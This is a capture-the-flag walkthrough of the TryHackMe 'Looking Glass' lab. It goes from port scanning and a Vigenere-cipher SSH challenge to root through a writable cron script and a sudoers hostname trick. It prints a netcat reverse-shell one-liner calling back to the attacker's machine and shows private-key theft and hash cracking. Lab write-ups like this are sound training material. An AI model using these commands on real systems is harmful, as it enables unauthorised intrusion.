---
title: "Walk-through of Looking Glass from TryHackMe"
header:
  teaser: /assets/images/2020-10-05-22-14-40.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - sudoers
  - ssh
  - Linux
---

## Machine Information

![looking-glass](/assets/images/2020-10-05-22-14-40.png)

Looking Glass is another room by [NinjaJc01](https://tryhackme.com/p/NinjaJc01), and a sequel to the first room of this series called [Wonderland](https://tryhackme.com/room/wonderland). This one is another mid level room themed around Alice In Wonderland. Skills required are basic enumeration techniques of ports, services and Linux file systems.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Looking Glass](https://tryhackme.com/room/lookingglass) |
| Machine Release Date | 16th August 2020 |
| Date I Completed It | 4th October June 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
root@kali:~# nmap -sC -sV -Pn 10.10.156.69
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 16:04 BST
Nmap scan report for 10.10.156.69
Host is up (0.042s latency).
Not shown: 916 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)

<SNIP>

13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.24 seconds
```

## Gaining Access

We see OpenSSH running on port 22. There are also thousands of ports open between 9000 and 14000. All of them are running Dropbear sshd, let's try connecting to one of them:

```text
root@kali:~/thm/looking# ssh root@10.10.156.69 -p 9000
The authenticity of host '[10.10.156.69]:9000 ([10.10.156.69]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.156.69]:9000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.156.69 closed.
```

We connected to the lowest Dropbear port and we found and the message **Lower** was returned to us, then we were disconnected. Let's try the highest port:

```text
root@kali:~/thm/looking# ssh root@10.10.156.69 -o StrictHostKeyChecking=no -p 13783
Warning: Permanently added '[10.10.156.69]:13783' (RSA) to the list of known hosts.
Higher
Connection to 10.10.156.69 closed.
```

This time we had the message **Higher**, so we can guess that these are clues to help us find the correct port. Although with this being Wonderland inspired the hints appear to be the wrong way around.

I keep trying until eventually we find the right port. Note that the port you are looking for changes every time the box is booted, so the one I have found here won't work for you.

After connecting we get this message:

```text
root@kali:~/thm/looking# ssh root@10.10.156.69 -o StrictHostKeyChecking=no -p 12448
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

The output looks to be some sort of encrypted text. Let's search for a way to decode it:

![google-decipher](/assets/images/2020-10-04-16-36-29.png)

On that site we find this page:

![boxentriq-detect](/assets/images/2020-10-04-16-37-56.png)

Let's paste our text in and see what it finds. After looking at the results I end up at the Vigenere Tool, where I paste the text and hit Auto Solve:

![boxentriq-detect](/assets/images/2020-10-04-16-40-43.png)

The default settings doesn't give us a result, but looking back at the encrypted text we can see some words are longer than 10 characters.

Changing the max key length to 20 gives us the key:

![boxentriq-key](/assets/images/2020-10-04-16-44-00.png)

Entering that key in the section above and clicking Decode now gives us the decoded text:

![boxentriq-result](/assets/images/2020-10-04-16-45-19.png)

At the end of the text is the Secret we have been looking for. Going back to our ssh connection we can now enter this phrase:

```text
Enter Secret:
jabberwock:GloriousTiptoeEldestHistory
Connection to 10.10.156.69 closed.
```

I have what appears to be a username and password. Note that this changes every time the box is booted, so what I have found here won't work for you.

## User Flag

Let's try ssh on port 22 now we have some credentials:

```text
root@kali:~/thm/looking# ssh jabberwock@10.10.156.69
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$
```

We are in, let's have a look at what we have here:

```text
jabberwock@looking-glass:~$ ls -l
total 12
-rw-rw-r-- 1 jabberwock jabberwock 935 Jun 30 01:45 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock  38 Jul  3 03:19 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock  38 Jul  3 02:53 user.txt
```

Looking at the files, poem.txt and twasBrillig.sh are used for the output when you connect to the random port. It's interesting that we have read, write and execute permissions on the script. That may be useful later.

The user.txt file is our first flag, although you'll notice it's back to front, so you'll need to reverse it:

```text
jabberwock@looking-glass:~$ cat user.txt | rev
thm{<<HIDDED<>>}
```

## Privilege Escalation

Now we need to find our path for getting to root. A quick look at the passwd file show there are a few users:

```text
jabberwock@looking-glass:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```

We can also check out crontab. This may help us work out what is running when the box boots that causes the random port to respond:

```text
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

The bottom line shows us when the server is rebooted the twasBrilling.sh script is run as user tweedledum. We know from earlier that we can edit the script, so now we just need to find a way to reboot the box.

Next thing to check is what sudo permissions we have:

```text
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

Excellent. We can reboot the box without a password as our initial user jabberwock.

Just like everyone else I use [PentestMonkeys](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) cheatsheets. Let's replace the contents of twasBrilling.sh with one from his site:

```text
jabberwock@looking-glass:~$ cp twasBrillig.sh twasBrillig.sh.bak
jabberwock@looking-glass:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.17.195 1234 >/tmp/f" > twasBrillig.sh
```

Now we can start a netcat listener on our Kali machine:

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
```

Then reboot the box and hopefully get a connection when it comes back up:

```text
jabberwock@looking-glass:~$ sudo /sbin/reboot
Connection to 10.10.156.69 closed by remote host.
Connection to 10.10.156.69 closed.
root@kali:~/thm/looking#
```

After a short while we see the box connects to us:

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.9.17.195] from (UNKNOWN) [10.10.156.69] 50348
/bin/sh: 0: can't access tty; job control turned off
$
```

## Second User

Let's see who we are:

```text
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
```

So now we are connected as user tweedledum. Let's upgrade to a proper shell before we do anything else:

```text
$ python3 -c "import pty;pty.spawn('/bin/bash')"
tweedledum@looking-glass:~$ ^Z         <<-- Ctrl+z puts session to background
[1]+  Stopped                 nc -nlvp 1234
root@kali:~# stty raw -echo
<<type fg and press enter to bring the shell back to the foreground>>
tweedledum@looking-glass:~$
```

That's better, now let's have a look in the home folder:

```text
tweedledum@looking-glass:~$ ls -l
total 8
-rw-r--r-- 1 root root 520 Jul  3 00:17 humptydumpty.txt
-rw-r--r-- 1 root root 296 Jul  3 00:23 poem.txt
tweedledum@looking-glass:~$ cat poem.txt
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'

tweedledum@looking-glass:~$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

We have two files, a poem and what looks to be something else that's encrypted. These look more like hashes than a cipher, so let's try an online hash cracker:

![hashes.com](/assets/images/2020-10-04-17-28-59.png)

We detect some as SHA256PLAIN hashes, and they decode to reveal a sentence. The last one is not a SHA256 hash, but instead it is hex encoded. Lucky for us the website auto detected it and decoded that one along with the others.

## Third User

So we now have another password, from a file called humptydumpty.txt. And we know from earlier when we looked at the passwd file that there is a user called humptydumpty, so let's try switching to them:

```text
tweedledum@looking-glass:~$ su humptydumpty
Password:
humptydumpty@looking-glass:/home/tweedledum$
humptydumpty@looking-glass:~$ id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```

Nice. We are now working in the context of the humptydumpty user.

Let's have a look around:

```text
humptydumpty@looking-glass:~$ ls -ls
4 -rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul  3 01:22 poetry.txt
```

The text file doesn't contain anything useful, let's look at home folder permissions:

```text
humptydumpty@looking-glass:~$ cd ..
humptydumpty@looking-glass:/home$ ls -ls
drwx--x--x  6 alice        alice        4096 Jul  3 02:53 alice
drwx------  3 humptydumpty humptydumpty 4096 Oct  4 16:37 humptydumpty
drwxrwxrwx  5 jabberwock   jabberwock   4096 Oct  4 16:17 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3 03:00 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3 02:42 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3 02:42 tweedledum
```

The alice home folder has unusual permissions, let's go in there and check for files:

```text
humptydumpty@looking-glass:/home$ cd alice
humptydumpty@looking-glass:/home/alice$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
<<SNIP>>
```

So we have permissions to read the .bashrc file in the alice home folder, even though we haven't got permissions to view the contents of that folder.

Let see if we can find something else obvious like an rsa key:

```text
humptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3 01:26 .ssh/id_rsa
```

We see there is an id_rsa file in the expected .ssh folder, but also notice it is owned by our current logged on user humptydumpty. So we can read the contents:

```text
humptydumpty@looking-glass:/home$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
<<HIDDEN>>
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

## Forth User

We can now ssh to alice using that file:

```text
humptydumpty@looking-glass:/home$ ssh alice@127.0.0.1 -i /home/alice/.ssh/id_rsa
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:kaciOm3nKZjBx4DS3cgsQa0DIVv86s9JtZ0m83r1Pu4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)
```

We could have also copied that id_rsa file to our local Kali box and then used ssh from there to get in as alice. Either way we are now logged in as our next user, let's have a look:

```text
alice@looking-glass:~$ ls -l
-rw-rw-r-- 1 alice alice 369 Jul  3 01:33 kitten.txt
alice@looking-glass:~$ cat kitten.txt
She took her off the table as she spoke, and shook her backwards and forwards with all her might.
The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—
—and it really was a kitten, after all.
```

Only the one seemingly useless text file. I spent some time looking around, but didn't find anything obvious so let's use an enumeration script. There's lots to choose from, I like [this](https://github.com/diego-treitos/linux-smart-enumeration) one becuase it is still being actively updated. Switching back to my Kali box let's pull the script down:

```text
root@kali:~/thm/looking# wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
--2020-10-04 22:24:05--  https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh [following]
--2020-10-04 22:24:06--  https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.56.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.56.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38430 (38K) [text/plain]
Saving to: ‘lse.sh’
lse.sh                                                     100%[=======================================================================================================================================>]  37.53K  --.-KB/s    in 0.02s
2020-10-04 22:24:06 (1.72 MB/s) - ‘lse.sh’ saved [38430/38430]

root@kali:~/thm/looking# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

With that downloaded and staged, we switch back to the box and grab it, then run:

```text
alice@looking-glass:~$ bash lse.sh -l 1
---
If you know the current user password, write it here to check sudo privileges:
---
 LSE Version: 2.8
        User: alice
     User ID: 1005
    Password: none
        Home: /home/alice
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002
    Hostname: looking-glass
       Linux: 4.15.0-109-generic
Distribution: Ubuntu 18.04.4 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. yes!
---
adm:x:4:syslog,tryhackme
sudo:x:27:tryhackme
---
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
---
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
---
/bin
/sbin
/usr/bin
/usr/games
/usr/local/bin
/usr/local/games
/usr/local/sbin
/usr/sbin
---
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... yes!
---
/etc/sudoers.d/alice:alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

After only a few seconds, and one of the first things the script finds is the obvious path to root. We can break the sudoers command down to:

```text
User = alice
Hostname = ssalg-gnikool
Permissions = root with no password required
Command we can execute = /bin/bash
```

The hostname ssalg-gnikool is the actual box hostname of looking-glass in reverse. We need to find a way to exploit this using sudo, which is easy using the -h flag:

```text
alice@looking-glass:~$ sudo -l -h ssalg-gnikool
sudo: unable to resolve host ssalg-gnikool
Matching Defaults entries for alice on ssalg-gnikool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash
```

This confirms what we thought, so now we can escalate to root:

```text
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag

Now we just need to get that last flag:

```text
root@looking-glass:/home/tryhackme# cd /root
root@looking-glass:/root# ls -l
drwxr-xr-x 2 root root 4096 Jun 30 01:24 passwords
-rw-r--r-- 1 root root  144 Jun 30 01:23 passwords.sh
-rw-r--r-- 1 root root   38 Jul  3 02:52 root.txt
-rw-r--r-- 1 root root  368 Jul  3 03:22 the_end.txt

root@looking-glass:/root# cat the_end.txt
She took her off the table as she spoke, and shook her backwards and forwards with all her might.
The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—
—and it really was a kitten, after all.

root@looking-glass:/root# cat root.txt
}<<HIDDEN>>{mht
```

As you'd expect on this box, the final flag is backwards so we just need to reverse it to reveal our goal:

```text
root@looking-glass:/root# cat root.txt | rev
thm{<<HIDDEN>>}
```

All done. See you next time.
